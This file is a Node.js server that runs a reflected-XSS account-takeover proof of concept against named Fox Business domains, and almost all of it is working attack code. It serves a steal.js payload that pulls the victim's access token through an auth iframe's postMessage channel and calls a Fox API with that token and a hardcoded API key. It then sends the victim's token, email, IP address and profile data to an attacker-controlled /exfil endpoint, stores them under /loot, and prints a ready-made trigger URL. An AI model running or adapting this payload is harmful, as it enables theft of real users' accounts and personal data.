/**
 * Reflected XSS → Account Takeover PoC
 * Target: origin.quote.foxbusiness.com/trade/go?symbol=PAYLOAD
 *
 * The XSS loads /steal.js which steals the victim's access token
 * via postMessage to the xd-channel.html auth iframe, then calls
 * the Fox API to read the victim's profile and exfiltrates everything.
 *
 * Routes:
 *   GET  /steal.js   → ATO payload (loaded by XSS)
 *   POST /exfil      → Receives stolen data
 *   GET  /exfil      → Error beacon
 *   GET  /loot       → View stolen account data
 *   GET  /           → Index with trigger URLs
 */

const http = require('http');
const url = require('url');

const PORT = process.env.PORT || 3000;
const SELF = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
const loot = [];

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // ── /steal.js ─────────────────────────────────────────────────────
  if (pathname === '/steal.js') {
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'no-cache');
    res.writeHead(200);
    res.end(`
(async function(){
  try {
    var SERVER = '${SELF}';

    // Step 1: Steal token via postMessage to xd-channel iframe
    var tokenData = await new Promise(function(ok, fail) {
      var t = setTimeout(function(){ fail('timeout') }, 10000);

      window.addEventListener('message', function h(e) {
        if (e.origin !== 'https://my.foxbusiness.com') return;
        try {
          var d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
          if (d.name === 'silentLogin' && d.data && d.data.token) {
            clearTimeout(t);
            window.removeEventListener('message', h);
            ok(d.data);
          }
        } catch(x) {}
      });

      var f = document.getElementById('xdchannel');
      if (!f) {
        f = document.createElement('iframe');
        f.id = 'xdchannel';
        f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
        f.style.display = 'none';
        (document.body || document.documentElement).appendChild(f);
        f.onload = function() {
          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
        };
      } else {
        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
      }
    });

    var tk = tokenData.token;

    // Step 2: Alert the stolen token as proof
    alert('STOLEN ACCESS TOKEN:\\n\\n' + tk);

    // Step 3: Decode JWT → get profileId
    var parts = tk.split('.');
    var jwtPayload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
    var profileId = jwtPayload.uid;

    // Step 4: Call Fox API
    var r = await fetch('https://api3.fox.com/v2.0/update/' + profileId, {
      headers: {
        'Authorization': 'Bearer ' + tk,
        'x-api-key': '4DfS6SQQBOoc2xImxylIam2ri8TXdHQV'
      }
    });
    var profile = await r.json();

    // Step 5: Exfiltrate
    await fetch(SERVER + '/exfil', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: tk,
        profileId: profile.profileId,
        email: profile.email,
        displayName: profile.displayName,
        firstName: profile.firstName,
        viewerId: profile.viewerId,
        ipAddress: profile.ipAddress,
        domain: document.domain
      })
    });

    // Visual proof
    document.title = 'ATO: ' + profile.email;
    var b = document.createElement('div');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:#d32f2f;color:#fff;padding:16px;font:bold 16px system-ui;text-align:center';
    b.textContent = 'Account Takeover - Stolen: ' + profile.email;
    (document.body || document.documentElement).prepend(b);

  } catch(e) {
    new Image().src = '${SELF}/exfil?err=' + encodeURIComponent(String(e));
  }
})();
`);
    return;
  }

  // ── /exfil ────────────────────────────────────────────────────────
  if (pathname === '/exfil') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', c => body += c);
      req.on('end', () => {
        try {
          const data = JSON.parse(body);
          data._ts = new Date().toISOString();
          data._ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
          loot.push(data);
          if (loot.length > 50) loot.shift();
          console.log(`[LOOT] ${data.email} | ${data.profileId}`);
        } catch(e) {}
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"ok":true}');
      });
      return;
    }
    if (parsed.query.err) console.log(`[ERR] ${parsed.query.err}`);
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    return;
  }

  // ── /loot ─────────────────────────────────────────────────────────
  if (pathname === '/loot') {
    res.setHeader('Content-Type', 'application/json');
    res.writeHead(200);
    res.end(JSON.stringify(loot, null, 2));
    return;
  }

  // ── / ─────────────────────────────────────────────────────────────
  res.setHeader('Content-Type', 'text/html');
  res.writeHead(200);
  res.end(`<!DOCTYPE html><html><body style="font-family:system-ui;max-width:700px;margin:2rem auto">
<h2>Reflected XSS &rarr; Account Takeover PoC</h2>
<h3>Trigger URL (login to Fox Business first):</h3>
<code style="word-break:break-all;background:#f0f0f0;padding:8px;display:block">http://origin.quote.foxbusiness.com/trade/go?symbol=aapl';$.getScript('${SELF}/steal.js');//</code>
<h3>Links:</h3>
<ul>
<li><a href="/steal.js">steal.js</a> — ATO payload</li>
<li><a href="/loot">Stolen data</a></li>
</ul>
</body></html>`);
});

server.listen(PORT, () => {
  console.log(`Reflected XSS ATO server: ${SELF}`);
  console.log(`Trigger: http://origin.quote.foxbusiness.com/trade/go?symbol=aapl';$.getScript('${SELF}/steal.js');//`);
  console.log(`Loot: ${SELF}/loot`);
});
